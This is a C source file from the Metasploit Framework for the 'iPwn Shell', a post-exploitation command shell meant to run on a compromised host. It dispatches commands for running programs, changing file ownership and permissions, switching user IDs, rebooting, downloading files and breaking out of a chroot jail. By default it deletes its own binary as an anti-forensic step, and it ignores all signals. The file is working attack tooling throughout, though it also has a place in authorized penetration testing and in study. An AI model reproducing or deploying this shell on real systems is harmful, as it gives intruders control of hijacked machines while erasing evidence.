/*
 * Copyright (c) 2004-2005 vlad902 <vlad902 [at] gmail.com>
 * Copyright (c) 2007 H D Moore <hdm [at] metasploit.com> 
 * This file is part of the Metasploit Framework.
 * $Revision$
 */

#include <sys/types.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <signal.h>

#include "cmd.h"
#include "auto.h"

struct __cmdhandler
{
	char * cmd;
	void (* handler)();
	unsigned int arg_process;
	unsigned int arg_min;
	unsigned int arg_max;
};

struct __cmdhandler handlerlist[] =
{
	{ "help", &cmd_help, 1, 0, 0 },
	{ "script", &cmd_script, 1, 1, 1 },			
	{ "fork", &cmd_fork, 1, 0, 0 },
	{ "exec", &cmd_exec, 1, 1, 14 },
	{ "system", &cmd_system, 1, 1, 14 },
	{ "quit", &cmd_quit, 1, 0, 0 },
	{ "exit", &cmd_quit, 1, 0, 0 },

	{ "open", &cmd_open, 1, 1, 1 },
	{ "lseek", &cmd_lseek, 1, 3, 3 },
	{ "read", &cmd_read, 1, 1, 2 },
	{ "write", &cmd_write, 1, 1, 2 },
	{ "close", &cmd_close, 1, 1, 1 },
	{ "dup", &cmd_dup, 1, 1, 1 },
	{ "dup2", &cmd_dup2, 1, 2, 2 },

	{ "ls", &cmd_ls, 1, 0, 1 },
	{ "getcwd", &cmd_getcwd, 1, 0, 0 },
	{ "pwd", &cmd_getcwd, 1, 0, 0 },
	{ "cd", &cmd_setcwd, 1, 0, 1 },
	{ "chmod", &cmd_chmod, 1, 2, 2 },
	{ "chown", &cmd_chown, 1, 2, 2 },
	{ "chgrp", &cmd_chgrp, 1, 2, 2 },
	{ "chdir", &cmd_chdir, 1, 1, 1 },
	{ "mkdir", &cmd_mkdir, 1, 1, 2 },
	{ "rmdir", &cmd_rmdir, 1, 1, 1 },
	{ "rename", &cmd_rename, 1, 2, 2 },
	{ "unlink", &cmd_unlink, 1, 1, 1 },
	{ "chroot", &cmd_chroot, 1, 1, 1 },
	{ "link", &cmd_link, 1, 2, 2 },
	{ "symlink", &cmd_symlink, 1, 2, 2 },
	{ "cp", &cmd_cp, 1, 2, 2 },

	{ "getid", &cmd_getid, 1, 0, 0 },
	{ "setuid", &cmd_setuid, 1, 1, 1 },
	{ "setgid", &cmd_setgid, 1, 1, 1 },

	{ "kill", &cmd_kill, 1, 1, 2 },
	{ "getpid", &cmd_getpid, 0, 0, 0 },
	{ "getppid", &cmd_getppid, 0, 0, 0 },
	{ "ps", &cmd_ps, 0, 0, 0 },
	
	{ "time", &cmd_time, 1, 0, 0, },
	{ "uname", &cmd_uname, 1, 0, 0 },
	{ "hostname", &cmd_hostname, 1, 0, 1 },
	{ "reboot", &cmd_reboot, 1, 0, 0 },
	{ "shutdown", &cmd_shutdown, 1, 0, 0 },
	{ "halt", &cmd_halt, 1, 0, 0 },

	{ "lsfd", &cmd_lsfd, 1, 0, 0 },
	
	{ "download", &cmd_download, 1, 2, 2 },

	{ "fchdir_breakchroot", &cmd_fchdir_breakchroot, 1, 1, 1 },
};

#define	HANDLERLIST_SIZE	(sizeof(handlerlist) / sizeof(struct __cmdhandler))
#define	MAX_ARGV	15
#define VERSION "0.01"

int main(int argc, char **argv) {
	char *p, *s, *b;
	int sig;

	if (argc <= 1 || strcmp(argv[1], "-k") != 0) {
		printf("Self-destruction mode is enabled by default, use -k to keep.\n");
		printf("Removing %s...\n", argv[0]);
		unlink(argv[0]);
	}
	
	/* process any embedded commands */
	if (automatic[0] != '#') {
		b = s = strdup(automatic);
		while ((p = strstr(s, "\n")) != NULL) {
			*p = '\0';
			
			printf("(auto) %s\n", s);
			process_input(s, strlen(s));
			
			s = p + 1;
		}
		printf("(auto) %s\n", s);
		
		process_input(s, strlen(s));
		free(b);
	}
	
	/* XXX: Big negative sbrk() to remove heap? */
	for(sig = 1; sig <= 64; sig++)
		signal(sig, SIG_IGN);

	signal(SIGCHLD, &sig_chld_waitpid);

	setvbuf(stdout, (char *)NULL, _IONBF, 0);
	printf(
	" __________________\n"
	"< iPwn Shell v%s >\n"
	" ------------------\n"
	"        \\   ^__^\n"
	"         \\  (00)\\_______\n"
	"            (__)\\       )\\/\\\n"
	"                ||----w |\n"
	"                ||     ||\n\n", VERSION);
    
	while(1)
	{
		char cmd[2048];
		char cmd_bak[sizeof(cmd)];
		char buf[1024];
		char *cwd;
	
		if(getcwd(buf, sizeof(buf)) == NULL)
			cwd = "(unknown)";
		else
			cwd = buf;
	        
		printf("ipwn (uid=%d) (%s) > ", getuid(), cwd);

		memset(cmd, 0, sizeof(cmd));
		if(fgets(cmd, sizeof(cmd), stdin) == NULL)
			exit(0);
		
		chomp(cmd);
		memcpy(cmd_bak, cmd, sizeof(cmd_bak));
		
		process_input(cmd, sizeof(cmd));
	}
}


int process_input(char *cmd, int cmd_size) {
	char * argv[MAX_ARGV];
	int argc;
	int i, hit;
	char *bak;
				
	parse(cmd, &argc, argv);
	if(argc == 0)
		return(0);

	bak = strdup(cmd);
	
	for(hit = i = 0; i < HANDLERLIST_SIZE; i++)
	{
		if(strcmp(argv[0], handlerlist[i].cmd) == 0)
		{
			hit = 1;

			if(handlerlist[i].arg_process)
			{
				if(argc > handlerlist[i].arg_max+1)
					printf("%s: Too many arguments\n", argv[0]);
				else if(argc < handlerlist[i].arg_min+1)
					printf("%s: Too few arguments\n", argv[0]);
				else
					handlerlist[i].handler(argc, argv);
			}
			else
			{
				handlerlist[i].handler(bak + strlen(handlerlist[i].cmd) + 1);
			}
		}
	}

	if(hit == 0)
	{
		printf("%s: Unknown command.\n", argv[0]);
	}
	
	free(bak);
	
	return 0;
}


void parse(char * str, int * const argc, char * argv[])
{
	*argc = 0;
	argv[0] = '\0';
				
	if(strlen(str) == 0)
		return;

	for(argv[(*argc)++] = str; strlen(str) && *argc < MAX_ARGV; str++)
	{
		if(*str == ' ')
		{
			*str = '\0';
			argv[(*argc)++] = str+1;
			argv[(*argc)] = '\0';
		}
		if(*str == '\\')
		{
			switch(*(str + 1))
			{
//				case 'n':
//					break;
				default:
					memmove(str, str+1, strlen(str));
					break;
			}
		}
	}
}

void chomp(char * str)
{
	if(strlen(str) > 0 && str[strlen(str) - 1] == '\n')
		str[strlen(str) - 1] = '\0';
	if(strlen(str) > 0 && str[strlen(str) - 1] == '\r')
		str[strlen(str) - 1] = '\0';
}


void sig_chld_ignore(int signal)
{
	return;
}

void sig_chld_waitpid(int signal)
{
	while(waitpid(-1, 0, WNOHANG) > 0);
}
